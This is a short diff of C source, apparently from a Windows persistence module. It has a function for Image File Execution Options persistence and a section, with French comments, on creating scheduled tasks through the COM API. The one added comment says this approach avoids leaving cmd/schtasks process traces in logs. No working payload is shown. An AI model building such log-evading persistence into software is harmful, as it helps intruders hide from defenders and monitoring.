@@ -390,6 +390,7 @@ static int persist_ifeo_remove(const char* target_exe) {
 /* =========================================================================
  * Scheduled Task via COM API
  * Plus discret que schtasks.exe en ligne de commande
+ * Ne laisse pas de trace de processus cmd/schtasks dans les logs
  * ========================================================================= */
 
 #include <taskschd.h>
